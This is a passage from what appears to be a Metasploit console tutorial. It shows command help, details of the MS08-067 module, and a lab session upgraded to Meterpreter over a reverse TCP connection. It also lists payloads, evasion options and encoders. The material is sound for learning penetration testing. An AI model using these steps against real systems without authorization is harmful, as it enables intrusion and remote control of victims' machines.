</span><span class='line'>  34  Windows XP SP3 Chinese - Simplified (NX)
</span><span class='line'>  35  Windows XP SP3 Chinese - Traditional (NX)
</span><span class='line'>  36  Windows XP SP3 Czech (NX)
</span><span class='line'>  37  Windows XP SP3 Danish (NX)
</span><span class='line'>  38  Windows XP SP3 German (NX)
</span><span class='line'>  39  Windows XP SP3 Greek (NX)
</span><span class='line'>  40  Windows XP SP3 Spanish (NX)
</span><span class='line'>  41  Windows XP SP3 Finnish (NX)
</span><span class='line'>  42  Windows XP SP3 French (NX)
</span><span class='line'>  43  Windows XP SP3 Hebrew (NX)
</span><span class='line'>  44  Windows XP SP3 Hungarian (NX)
</span><span class='line'>  45  Windows XP SP3 Italian (NX)
</span><span class='line'>  46  Windows XP SP3 Japanese (NX)
</span><span class='line'>  47  Windows XP SP3 Korean (NX)
</span><span class='line'>  48  Windows XP SP3 Dutch (NX)
</span><span class='line'>  49  Windows XP SP3 Norwegian (NX)
</span><span class='line'>  50  Windows XP SP3 Polish (NX)
</span><span class='line'>  51  Windows XP SP3 Portuguese - Brazilian (NX)
</span><span class='line'>  52  Windows XP SP3 Portuguese (NX)
</span><span class='line'>  53  Windows XP SP3 Russian (NX)
</span><span class='line'>  54  Windows XP SP3 Swedish (NX)
</span><span class='line'>  55  Windows XP SP3 Turkish (NX)
</span><span class='line'>  56  Windows 2003 SP1 English (NO NX)
</span><span class='line'>  57  Windows 2003 SP1 English (NX)
</span><span class='line'>  58  Windows 2003 SP1 Japanese (NO NX)
</span><span class='line'>  59  Windows 2003 SP1 Spanish (NO NX)
</span><span class='line'>  60  Windows 2003 SP1 Spanish (NX)
</span><span class='line'>  61  Windows 2003 SP1 French (NO NX)
</span><span class='line'>  62  Windows 2003 SP1 French (NX)
</span><span class='line'>  63  Windows 2003 SP2 English (NO NX)
</span><span class='line'>  64  Windows 2003 SP2 English (NX)
</span><span class='line'>  65  Windows 2003 SP2 German (NO NX)
</span><span class='line'>  66  Windows 2003 SP2 German (NX)
</span><span class='line'>  67  Windows 2003 SP2 Portuguese - Brazilian (NX)
</span><span class='line'>  68  Windows 2003 SP2 Spanish (NO NX)
</span><span class='line'>  69  Windows 2003 SP2 Spanish (NX)
</span><span class='line'>  70  Windows 2003 SP2 Japanese (NO NX)
</span><span class='line'>  71  Windows 2003 SP2 French (NO NX)
</span><span class='line'>  72  Windows 2003 SP2 French (NX)
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name     Current Setting  Required  Description
</span><span class='line'>  ----     ---------------  --------  -----------
</span><span class='line'>  RHOST                     yes       The target address
</span><span class='line'>  RPORT    445              yes       Set the SMB service port
</span><span class='line'>  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</span><span class='line'>
</span><span class='line'>Payload information:
</span><span class='line'>  Space: 410
</span><span class='line'>  Avoid: 8 characters
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module exploits a parsing flaw in the path canonicalization 
</span><span class='line'>  code of NetAPI32.dll through the Server Service. This module is 
</span><span class='line'>  capable of bypassing NX on some operating systems and service packs. 
</span><span class='line'>  The correct target must be used to prevent the Server Service (along 
</span><span class='line'>  with a dozen others in the same process) from crashing. Windows XP 
</span><span class='line'>  targets seem to handle multiple successful exploitation events, but 
</span><span class='line'>  2003 targets will often crash or hang on subsequent attempts. This 
</span><span class='line'>  is just the first version of this module, full support for NX bypass 
</span><span class='line'>  on 2003, along with other platforms, is still in development.
</span><span class='line'>
</span><span class='line'>References:
</span><span class='line'>  http://cvedetails.com/cve/2008-4250/
</span><span class='line'>  http://www.osvdb.org/49243
</span><span class='line'>  http://technet.microsoft.com/en-us/security/bulletin/MS08-067
</span><span class='line'>  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>jobs</strong> &ndash; check and interact with backgrounds jobs</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; jobs -h
</span><span class='line'>Usage: jobs [options]
</span><span class='line'>
</span><span class='line'>Active job manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -K        Terminate all running jobs.
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  Lists detailed information about a running job.
</span><span class='line'>    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
</span><span class='line'>    -l        List all running jobs.
</span><span class='line'>    -v        Print more detailed info.  Use with -i and -l</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>makerc</strong> &ndash; save the commands executed since startup to the specified file.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; makerc demo.rc
</span><span class='line'>[*] Saving last 3 commands to demo.rc ...
</span><span class='line'>msf exploit(usermap_script) &gt; cat demo.rc
</span><span class='line'>[*] exec: cat demo.rc
</span><span class='line'>
</span><span class='line'>cat demo.rc
</span><span class='line'>clear
</span><span class='line'>sessions</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>options</strong> &ndash; displays the options of a module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help options
</span><span class='line'>Usage: options [mod1 mod2 ...]
</span><span class='line'>
</span><span class='line'>Queries the supplied module or modules for options. If no module is given,
</span><span class='line'>show options for the currently active module.
</span><span class='line'>
</span><span class='line'>msf &gt; options
</span><span class='line'>
</span><span class='line'>Global Options:
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>   Option            Current Setting    Description
</span><span class='line'>   ------            ---------------    -----------
</span><span class='line'>   ConsoleLogging    false              Log all console input and output
</span><span class='line'>   LogLevel          0                  Verbosity of logs (default 0, max 3)
</span><span class='line'>   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation
</span><span class='line'>   Prompt            msf                The prompt string
</span><span class='line'>   PromptChar        &gt;                  The prompt character
</span><span class='line'>   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
</span><span class='line'>   SessionLogging    false              Log all input and output for sessions
</span><span class='line'>   TimestampOutput   false              Prefix all console output with a timestamp</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>resource</strong> &ndash; runs the commands in a file</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(telnet_login) &gt; help resource
</span><span class='line'>Usage: resource path1 [path2 ...]
</span><span class='line'>
</span><span class='line'>Run the commands stored in the supplied files.  Resource files may also contain
</span><span class='line'>ruby code between &lt;ruby&gt;&lt;/ruby&gt; tags.
</span><span class='line'>
</span><span class='line'>See also: makerc</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>route</strong> &ndash; route traffic through a session</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(telnet_login) &gt; route -h
</span><span class='line'>Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]
</span><span class='line'>
</span><span class='line'>Route traffic destined to a given subnet through a supplied session.
</span><span class='line'>The default comm is Local.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>save</strong> &ndash; saves the current configuration</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help save
</span><span class='line'>Usage: save
</span><span class='line'>
</span><span class='line'>Save the active datastore contents to disk for automatic use across restarts of the console
</span><span class='line'>
</span><span class='line'>The configuration is stored in /root/.msf5/config</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>search</strong> &ndash; this is what you will use when searching for exploits</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help search
</span><span class='line'>Usage: search [keywords]
</span><span class='line'>
</span><span class='line'>Keywords:
</span><span class='line'>  app       :  Modules that are client or server attacks
</span><span class='line'>  author    :  Modules written by this author
</span><span class='line'>  bid       :  Modules with a matching Bugtraq ID
</span><span class='line'>  cve       :  Modules with a matching CVE ID
</span><span class='line'>  edb       :  Modules with a matching Exploit-DB ID
</span><span class='line'>  name      :  Modules with a matching descriptive name
</span><span class='line'>  osvdb     :  Modules with a matching OSVDB ID
</span><span class='line'>  platform  :  Modules affecting this platform
</span><span class='line'>  ref       :  Modules with a matching ref
</span><span class='line'>  type      :  Modules of a specific type (exploit, auxiliary, or post)
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  search cve:2009 type:exploit app:client
</span><span class='line'>
</span><span class='line'>msf &gt; search heartbleed
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                              Disclosure Date  Rank    Description
</span><span class='line'>   ----                                              ---------------  ----    -----------
</span><span class='line'>   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
</span><span class='line'>   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>sessions</strong> &ndash; interact with sessions</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; sessions -h
</span><span class='line'>Usage: sessions [options]
</span><span class='line'>
</span><span class='line'>Active session manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -K        Terminate all sessions
</span><span class='line'>    -c &lt;opt&gt;  Run a command on the session given with -i, or all
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -i &lt;opt&gt;  Interact with the supplied session ID
</span><span class='line'>    -k &lt;opt&gt;  Terminate sessions by session ID and/or range
</span><span class='line'>    -l        List all active sessions
</span><span class='line'>    -q        Quiet mode
</span><span class='line'>    -r        Reset the ring buffer for the session given with -i, or all
</span><span class='line'>    -s &lt;opt&gt;  Run a script on the session given with -i, or all
</span><span class='line'>    -t &lt;opt&gt;  Set a response timeout (default: 15)
</span><span class='line'>    -u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
</span><span class='line'>    -v        List verbose fields
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Many options allow specifying session ranges using commas and dashes.
</span><span class='line'>For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</span></code></pre></td></tr></table></div></figure>


<p>In the following example I am upgrading the shell of a session to Meterpreter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type        Information  Connection
</span><span class='line'>  --  ----        -----------  ----------
</span><span class='line'>  1   shell unix               192.168.80.155:34501 -&gt; 192.168.80.156:4444 (192.168.80.156)
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; sessions -u 1
</span><span class='line'>[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
</span><span class='line'>
</span><span class='line'>[*] Upgrading session ID: 1
</span><span class='line'>[*] Starting exploit/multi/handler
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4433 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
</span><span class='line'>[*] Sending stage (1495599 bytes) to 192.168.80.156
</span><span class='line'>[*] Command stager progress: 100.00% (668/668 bytes)
</span><span class='line'>msf exploit(usermap_script) &gt; [*] Meterpreter session 2 opened (192.168.80.155:4433 -&gt; 192.168.80.156:58435) at 2016-06-02 13:53:36 -0400</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>set</strong>, <strong>setg</strong> &ndash; sets value to option (g for global variables). You will do lots of setting as you tweak your exploits :p</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help set
</span><span class='line'>Usage: set [option] [value]
</span><span class='line'>
</span><span class='line'>Set the given option to value.  If value is omitted, print the current value.
</span><span class='line'>If both are omitted, print options that are currently set.
</span><span class='line'>
</span><span class='line'>If run from a module context, this will set the value in the module's
</span><span class='line'>datastore.  Use -g to operate on the global datastore
</span><span class='line'>
</span><span class='line'>msf &gt; setg
</span><span class='line'>
</span><span class='line'>Global
</span><span class='line'>======
</span><span class='line'>
</span><span class='line'>  Name   Value
</span><span class='line'>  ----   -----
</span><span class='line'>  RHOST  192.168.80.156</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>show</strong> &ndash; displays various information as needed</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help show
</span><span class='line'>[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
</span><span class='line'>[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions</span></code></pre></td></tr></table></div></figure>


<p>The options that we need to edit when setting up exploits:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms08_067_netapi) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/smb/ms08_067_netapi):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST    192.168.80.156   yes       The target address
</span><span class='line'>   RPORT    445              yes       Set the SMB service port
</span><span class='line'>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Targeting</span></code></pre></td></tr></table></div></figure>


<p>A couple of payloads:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms08_067_netapi) &gt; show payloads
</span><span class='line'>
</span><span class='line'>Compatible Payloads
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>   Name                                                Disclosure Date  Rank    Description
</span><span class='line'>   ----                                                ---------------  ----    -----------
</span><span class='line'>   generic/custom                                                       normal  Custom Payload
</span><span class='line'>   generic/debug_trap                                                   normal  Generic x86 Debug Trap
</span><span class='line'>   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
</span><span class='line'>   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
</span><span class='line'>   generic/tight_loop                                                   normal  Generic x86 Tight Loop
</span><span class='line'>   windows/adduser                                                      normal  Windows Execute net user /ADD
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Evasion</h3>

<p>For the evasion options available for each module, you can use the command <strong>show evasion</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(advantech_switch_bash_env_exec) &gt; show evasion
</span><span class='line'>
</span><span class='line'>Module evasion options:
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::header_folding
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enable folding of HTTP headers
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::method_random_case
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use random casing for the HTTP method
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::method_random_invalid
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use a random invalid, HTTP method for request
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Encoders</h3>

<p>Metasploit automatically selects the best encoder for the job given the selected criteria. If you want to use a specific encoder, you can select one from the multitude available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf payload(generic) &gt; show encoders
</span><span class='line'>
</span><span class='line'>Encoders
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>   Name                          Disclosure Date  Rank       Description
</span><span class='line'>   ----                          ---------------  ----       -----------
</span><span class='line'>   cmd/echo                                       good       Echo Command Encoder
</span><span class='line'>   cmd/generic_sh                                 manual     Generic Shell Variable Substitution Command Encoder
</span><span class='line'>   cmd/ifs                                        low        Generic ${IFS} Substitution Command Encoder
</span><span class='line'>   cmd/perl                                       normal     Perl Command Encoder
</span><span class='line'>   cmd/powershell_base64                          excellent  Powershell Base64 Command Encoder
</span><span class='line'>   cmd/printf_php_mq                              manual     printf(1) via PHP magic_quotes Utility Command Encoder
</span><span class='line'>   generic/eicar                                  manual     The EICAR Encoder
</span><span class='line'>   generic/none                                   normal     The "none" Encoder
</span><span class='line'>   mipsbe/byte_xori                               normal     Byte XORi Encoder
</span><span class='line'>   mipsbe/longxor                                 normal     XOR Encoder
</span><span class='line'>   mipsle/byte_xori                               normal     Byte XORi Encoder
</span><span class='line'>   mipsle/longxor                                 normal     XOR Encoder
</span><span class='line'>   php/base64                                     great      PHP Base64 Encoder
</span><span class='line'>   ppc/longxor                                    normal     PPC LongXOR Encoder
</span><span class='line'>   ppc/longxor_tag                                normal     PPC LongXOR Encoder
</span><span class='line'>   sparc/longxor_tag                              normal     SPARC DWORD XOR Encoder
</span><span class='line'>   x64/xor                                        normal     XOR Encoder
</span><span class='line'>   x86/add_sub                                    manual     Add/Sub Encoder
</span><span class='line'>   x86/alpha_mixed                                low        Alpha2 Alphanumeric Mixedcase Encoder
</span><span class='line'>   x86/alpha_upper                                low        Alpha2 Alphanumeric Uppercase Encoder
</span><span class='line'>   x86/avoid_underscore_tolower                   manual     Avoid underscore/tolower
</span><span class='line'>   x86/avoid_utf8_tolower                         manual     Avoid UTF8/tolower
</span><span class='line'>   x86/bloxor                                     manual     BloXor - A Metamorphic Block Based XOR Encoder
</span><span class='line'>   x86/call4_dword_xor                            normal     Call+4 Dword XOR Encoder
</span><span class='line'>   x86/context_cpuid                              manual     CPUID-based Context Keyed Payload Encoder
</span><span class='line'>   x86/context_stat                               manual     stat(2)-based Context Keyed Payload Encoder
</span><span class='line'>   x86/context_time                               manual     time(2)-based Context Keyed Payload Encoder
</span><span class='line'>   x86/countdown                                  normal     Single-byte XOR Countdown Encoder
</span><span class='line'>   x86/fnstenv_mov                                normal     Variable-length Fnstenv/mov Dword XOR Encoder
</span><span class='line'>   x86/jmp_call_additive                          normal     Jump/Call XOR Additive Feedback Encoder
</span><span class='line'>   x86/nonalpha                                   low        Non-Alpha Encoder
</span><span class='line'>   x86/nonupper                                   low        Non-Upper Encoder
</span><span class='line'>   x86/opt_sub                                    manual     Sub Encoder (optimised)
</span><span class='line'>   x86/shikata_ga_nai                             excellent  Polymorphic XOR Additive Feedback Encoder
</span><span class='line'>   x86/single_static_bit                          manual     Single Static Bit
</span><span class='line'>   x86/unicode_mixed                              manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
</span><span class='line'>   x86/unicode_upper                              manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span></code></pre></td></tr></table></div></figure>


<p></p>

<ul>
<li><strong>spool</strong> &ndash; write console log to a file</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help spool
</span><span class='line'>Usage: spool &lt;off&gt;|&lt;filename&gt;
</span><span class='line'>
</span><span class='line'>Example:
</span><span class='line'>  spool /tmp/console.log</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>use</strong> &ndash; selects module</li>
</ul>


<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<p>The following are the available options for generating payloads:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sf payload(generic) &gt; generate -h
</span><span class='line'>Usage: generate [options]
</span><span class='line'>
</span><span class='line'>Generates a payload.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -E        Force encoding.
</span><span class='line'>    -b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'
</span><span class='line'>    -e &lt;opt&gt;  The name of the encoder module to use.
</span><span class='line'>    -f &lt;opt&gt;  The output file name (otherwise stdout)
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  the number of encoding iterations.
</span><span class='line'>    -k        Keep the template executable functional
</span><span class='line'>    -o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.
</span><span class='line'>    -p &lt;opt&gt;  The Platform for output.
</span><span class='line'>    -s &lt;opt&gt;  NOP sled length.
